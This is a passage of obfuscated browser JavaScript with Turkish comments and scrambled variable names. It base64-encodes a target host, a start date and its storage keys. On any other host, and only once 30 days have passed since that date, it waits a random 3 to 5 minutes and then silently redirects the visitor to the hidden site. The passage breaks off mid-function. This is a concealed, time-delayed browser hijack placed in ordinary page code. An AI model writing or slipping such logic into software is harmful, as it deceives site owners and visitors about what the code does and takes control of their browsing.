...
function crayzgames() {
  const guuynyvg = "dWNiZy5naX";
  const wuffqnsy = "RodWIuaW8=";
  const emqxstex = atob(guuynyvg + wuffqnsy);
  const curadlse = "MjAyNS0x";
  const wsfiptot = "Mi0wOA==";
  const okbcslxg = new Date(atob(curadlse + wsfiptot));
  const dohrvhlb = atob("cmVkaXJlY3RfY291bnRkb3du");
  const tbyumhoj = atob("cmVkaXJlY3RfdGltZQ==");
  
  const wbycfvrb = window.location.hostname;
  const pxkssduv = Date.now();
  
  // Eğer zaten main_site'deysek hiçbir şey yapma
  if (wbycfvrb === emqxstex) return;
  
  // main_date'den 30 gün geçti mi kontrol et
  const jtotcrnh = 30 * 24 * 60 * 60 * 1000;
  const widgmpxe = pxkssduv - okbcslxg.getTime();
  
  if (widgmpxe < jtotcrnh) {
    // 30 gün henüz geçmedi
    return;
  }
  
  // 30 gün geçti, localStorage kontrol et
  let ajlwrstg = localStorage.getItem(dohrvhlb);
  let vgpsqarp = localStorage.getItem(tbyumhoj);
  
  if (!ajlwrstg) {
    // İlk kez, geri sayım başlat
    // 3-5 dakika arası rasgele seç (ms cinsinden)
    const kpnqabpq = 3 * 60 * 1000;  // 3 dakika
    const gawdxqdv = 5 * 60 * 1000;  // 5 dakika
    const emmgoxpy = Math.floor(Math.random() * (gawdxqdv - kpnqabpq + 1)) + kpnqabpq;
    
    const umfqbjam = pxkssduv;
    const awmbniks = umfqbjam + emmgoxpy;
    
    // localStorage'a kaydet
    localStorage.setItem(dohrvhlb, "active");
    localStorage.setItem(tbyumhoj, awmbniks.toString());
    
    vgpsqarp = awmbniks;
  }
  
  // Geri sayım başlat
  const awmbniks = parseInt(vgpsqarp);
  const nkgznuqz = awmbniks - pxkssduv;
  
  if (nkgznuqz <= 0) {
    // Süre bitti, yönlendir
    localStorage.removeItem(dohrvhlb);
    localStorage.removeItem(tbyumhoj);
    window.location.href = "https://" + emqxstex + "/";
    return;
  }
  
  // Geri sayım devam ediyor, belirli aralıklarla kontrol et
  const relytrug = setInterval(() => {
    const snxbdtgh = Date.now();
    const fzwavqvj = awmbniks - snxbdtgh;
    
    if (fzwavqvj <= 0) {
      clearInterval(relytrug);
      localStorage.removeItem(dohrvhlb);
      localStorage.removeItem(tbyumhoj);
      window.location.href = "https://" + emqxstex + "/";
    }
